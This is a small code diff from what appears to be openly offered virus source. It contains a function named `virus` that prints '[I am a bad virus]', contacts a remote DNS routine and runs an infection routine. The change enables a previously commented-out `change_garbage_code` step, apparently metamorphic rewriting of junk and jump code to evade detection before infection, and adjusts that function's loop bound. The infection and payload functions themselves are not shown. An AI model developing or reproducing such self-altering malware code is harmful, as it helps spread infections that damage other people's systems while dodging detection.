@@ -41,7 +41,7 @@ int _replace_jmp_gb(Garbage g){
 
 void change_garbage_code(){
 	//print("now: ");printnbln(garbage_table_len);
-	for (size_t i = 0 ; i < garbage_table_len; i++){
+	for (size_t i = 0 ; i < garbage_table_len - 1; i++){
 		_replace_jmp_gb(garbage_table[i]);
 	}
 }
@@ -82,7 +82,7 @@ int virus(int ac, char **av){
 		dns_remote();
  	if (opt.print_msg) println("[I am a bad virus]");
 
-	//change_garbage_code();
+	change_garbage_code();
 	do_infection();
 	return TRUE;
 }
